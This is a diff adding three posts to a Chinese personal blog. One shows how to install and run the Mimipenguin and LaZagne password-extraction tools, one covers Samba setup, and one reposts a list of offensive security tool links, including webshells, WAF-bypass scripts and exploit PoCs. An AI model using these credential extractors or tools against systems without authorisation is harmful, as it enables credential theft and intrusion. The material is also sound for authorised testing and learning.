@@ -258,6 +258,1123 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/07/两款密码提取工具的配置和使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/12/07/两款密码提取工具的配置和使用/" itemprop="url">
+                  两款密码提取工具的配置和使用
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-07T11:59:46+08:00">
+                2019-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows/" itemprop="url" rel="index">
+                    <span itemprop="name">windows</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/12/07/两款密码提取工具的配置和使用/" class="leancloud_visitors" data-flag-title="两款密码提取工具的配置和使用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="linux密码提取工具Mimipenguin配置及其使用"><a href="#linux密码提取工具Mimipenguin配置及其使用" class="headerlink" title="linux密码提取工具Mimipenguin配置及其使用"></a>linux密码提取工具Mimipenguin配置及其使用</h2><h3 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h3><p>Mimipenguin从Linux内存中提取登录密码的工具。改编自流行的Windows工具mimikatz。</p>
+<h3 id="安装Mimipenguin"><a href="#安装Mimipenguin" class="headerlink" title="安装Mimipenguin"></a>安装Mimipenguin</h3><p>首先从github上克隆Mimipenguin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/huntergregal/mimipenguin</span><br></pre></td></tr></table></figure></p>
+<p>然后安装Mimipenguin的依赖GLIBC_2.14，而GLIBC_2.14我们需要源码编译安装，所以需要安装gcc</p>
+<p>根据不同系统选择不同的安装命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install gcc</span><br><span class="line">yum install gcc</span><br></pre></td></tr></table></figure></p>
+<p>完成之后，我们先创建一个路径存放下载的源码，然后下载GLIBC_2.14的源码进行编译安装并链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/tar</span><br><span class="line">cd /home/tar</span><br><span class="line">wget https://ftp.gnu.org/gnu/glibc/glibc-2.14.tar.gz</span><br><span class="line">tar -zxvf glibc-2.14.tar.gz</span><br><span class="line">cd glibc-2.14</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --prefix=/usr/local/glibc-2.14</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br><span class="line">export LD_LIBRARY_PATH=LD_LIBRARY_PATH:/home/tar/glibc-2.14/build/</span><br></pre></td></tr></table></figure></p>
+<p>然后进入mimipenguin目录，运行mimipenguin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mimipenguin</span><br></pre></td></tr></table></figure></p>
+<h2 id="密码提取工具LaZagne"><a href="#密码提取工具LaZagne" class="headerlink" title="密码提取工具LaZagne"></a>密码提取工具LaZagne</h2><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p>LaZagne是一款可以在windows、linux、mac中提取密码的工具，包括各类浏览器中保存的密码，本地保存的私钥文件，windows的登陆密码，记住的wifi密码等。每个环境中的安装使用操作都比较相似，本部分以windows为例介绍一下安装运行过程。</p>
+<h3 id="安装LaZagne"><a href="#安装LaZagne" class="headerlink" title="安装LaZagne"></a>安装LaZagne</h3><p>LaZagne需要python环境才可以运行，所以要提前准备python环境，并将pip更新到最新版本。</p>
+<p>在windows本地任意文件夹内下载LaZagne源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AlessandroZ/LaZagne.git</span><br></pre></td></tr></table></figure>
+<p>requirements.txt中说明了运行LaZagne需要哪些依赖,requirements.txt:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum34; python_version &lt; &apos;3.4&apos; and sys_platform == &apos;win32&apos;</span><br><span class="line">psutil; sys_platform == &apos;linux&apos; or sys_platform == &apos;linux2&apos;</span><br><span class="line">pyasn1</span><br><span class="line">rsa; sys_platform == &apos;win32&apos;</span><br><span class="line">secretstorage; sys_platform == &apos;linux&apos; or sys_platform == &apos;linux2&apos;</span><br><span class="line">https://github.com/AlessandroZ/pypykatz/archive/master.zip; sys_platform == &apos;win32&apos;  # should point to pypykatz if my PR is approved</span><br></pre></td></tr></table></figure></p>
+<p>在命令行中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install r requirements.txt</span><br></pre></td></tr></table></figure></p>
+<p>接着进入Windows目录(如果是其他系统就使用对应目录脚本)，根据需要获取的密码范围运行laZagne.py来获取密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#运行所有模块</span><br><span class="line">python laZagne.py all</span><br><span class="line">#仅从浏览器获取密码</span><br><span class="line">python laZange.py browsers</span><br><span class="line">#仅从火狐浏览器获取密码</span><br><span class="line">python laZagne.py browsers -firefox</span><br></pre></td></tr></table></figure></p>
+<p>如果运行laZagne.py中报错缺少依赖，就根据报错信息pip安装所需依赖直到可以运行。</p>
+<p>运行结果部分截图</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/password_get/password01.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/02/samba安装与配置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/09/02/samba安装与配置/" itemprop="url">
+                  samba安装与配置
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-02T23:21:05+08:00">
+                2019-09-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/09/02/samba安装与配置/" class="leancloud_visitors" data-flag-title="samba安装与配置">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="samba-简介"><a href="#samba-简介" class="headerlink" title="samba 简介"></a>samba 简介</h3><p>Samba，用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结，在Windows与UNIX系列OS之间搭起一座桥梁，使两者可以进行资源共享。<br>常用于需要频繁访问和读写文件的情况，如在windows下使用人性化的编辑器来书写或修改代码，在linux中进行频繁的编译验证这种场景。本文就以这种场景为例介绍samba的安装和配置。</p>
+<h3 id="samba-安装"><a href="#samba-安装" class="headerlink" title="samba 安装"></a>samba 安装</h3><p>根据自身情况选择命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install samba</span><br><span class="line">apt-get install samba</span><br><span class="line">yum install samba</span><br></pre></td></tr></table></figure></p>
+<h3 id="samba-配置"><a href="#samba-配置" class="headerlink" title="samba 配置"></a>samba 配置</h3><p>进入samba配置文件目录，编辑配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/samba</span><br><span class="line">vi smb.conf</span><br></pre></td></tr></table></figure></p>
+<p>在末尾添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[share]</span><br><span class="line">    path =/home/share</span><br><span class="line">    available = yes</span><br><span class="line">    browsealbe = yes</span><br><span class="line">    public= no</span><br><span class="line">    writable = yes</span><br></pre></td></tr></table></figure></p>
+<p>然后在/home下创建share目录，并提升权限至777<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">mkdir share</span><br><span class="line">chmod -R 777 share</span><br></pre></td></tr></table></figure></p>
+<p>然后添加samba用户share，注意这里必须先添加一个同名的系统用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd share</span><br><span class="line">smbpasswd -a share</span><br></pre></td></tr></table></figure></p>
+<p>设置完成密码后重启samba服务</p>
+<p>根据不同系统，选择不同命令启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/samba restart</span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure></p>
+<p>完成后，通过windows访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\linux机器的ip</span><br></pre></td></tr></table></figure></p>
+<p>输入账号密码进入共享文件夹，开始方便的资源共享。</p>
+<p>接着就可以把需要在linux环境运行的代码，git clone到share目录下然后使用windows的编辑器编辑了。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/26/python渗透测试工具库-转载/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/08/26/python渗透测试工具库-转载/" itemprop="url">
+                  python渗透测试工具库[转载]
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T22:05:19+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/08/26/python渗透测试工具库-转载/" class="leancloud_visitors" data-flag-title="python渗透测试工具库[转载]">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="漏洞练习平台"><a href="#漏洞练习平台" class="headerlink" title="漏洞练习平台"></a>漏洞练习平台</h2><p>WebGoat漏洞练习平台：<br><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p>
+<p>webgoat-legacy漏洞练习平台:<br><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+<p>zvuldirll漏洞练习平台：<br><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a></p>
+<p>vulapps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p>
+<p>dvwa漏洞练习平台：<br><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p>
+<p>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<p>用node编写的漏洞练习平台，like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p>
+<p>Ruby编写的一款工具，生成含漏洞的虚拟机：<br><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p>
+<h2 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h2><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p>
+<p>本地网络扫描器：<br><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p>
+<p>子域名扫描器：<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p>
+<p>linux漏洞扫描：<br><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p>
+<p>基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a></p>
+<p>漏洞路由扫描器：<br><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p>
+<p>迷你批量信息泄漏扫描脚本：<br><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p>
+<p>Waf类型检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p>
+<p>服务器端口弱口令扫描器：<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a></p>
+<p>Fox-scan扫描器：<br><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h2 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h2><p>社工收集器：<br><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p>
+<p>Github信息搜集：<br><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p>
+<p>github Repo信息搜集工具：<br><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p>
+<p>信息探测及扫描工具：<br><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p>
+<p>内部网络信息扫描器：<br><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p>
+<p>远程桌面登录扫描器：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p>
+<p>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p>
+<p>SNMAP密码破解:<br><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>webshell大合集：<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p>
+<p>渗透以及web攻击脚本：<br><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p>
+<p>web渗透小工具大合集：<br><a href="https://github.com/rootphantomer/hacktoolsfor_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hacktoolsfor_me</a></p>
+<p>XSS数据接收平台：<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p>XSS与CSRF工具：<br><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p>
+<p>xss多功能扫描器：<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p>
+<p>web漏洞扫描器:<br><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p>
+<p>WEB漏洞扫描器：<br><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p>
+<p>渗透常用小工具包：<br><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p>
+<p>web目录扫描器:<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
+<p>web向命令注入检测工具：<br><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p>
+<p>自动化SQL注入检查工具：<br><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p>
+<p>SSL扫描器：<br><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p>
+<p>安全工具集合：<br><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p>
+<p>apache日志分析器：<br><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p>
+<p>php代码审计工具：<br><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p>
+<p>web指纹识别扫描：<br><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p>
+<p>检查网站恶意攻击：<br><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p>
+<p>wordprees漏洞扫描器：<br><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>
+<p>固件漏洞扫描器：<br><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p>
+<p>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p>
+<p>Web代理：<br><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p>
+<p>新版中国菜刀：<br><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p>
+<p>git泄露利用EXP：<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<p>浏览器攻击框架：<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p>
+<p>自动化绕过WAF脚本：<br><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p>
+<p>一款开源WAF：<br><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p>
+<p>http命令行客户端：<br><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p>
+<p>浏览器调试利器：<br><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p>
+<p>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p>
+<p>自动化代码审计工具<br><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p>
+<p>浏览器攻击框架：<br><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p>
+<p>tomcat自动后门部署：<br><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p>
+<p>网络空间指纹扫描器：<br><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p>
+<p>burpsuit之J2EE扫描插件：<br><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p>
+<h2 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h2><p>mimikatz明文注入：<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>
+<p>Powershell渗透库合集：<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>Powershell tools合集：<br><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p>
+<p>powershell的mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a></p>
+<p>域渗透教程:<br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p>
+<p>Fuzz:<br>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p>
+<p>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p>
+<h2 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h2><p>msf框架：<br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p>
+<p>pocsscan攻击框架：<br><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p>
+<p>Pocsuite攻击框架:<br><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p>
+<p>Beebeeto攻击框架：<br><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p>
+<p>漏洞POC&amp;EXP:<br>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p>
+<p>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p>
+<p>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p>
+<p>CVE-2015-7547 POC：<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p>
+<p>JAVA反序列化POC生成工具:<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>JAVA反序列化EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
+<p>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
+<p>CVE-2015-2426 EXP (windows内核提权):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p>
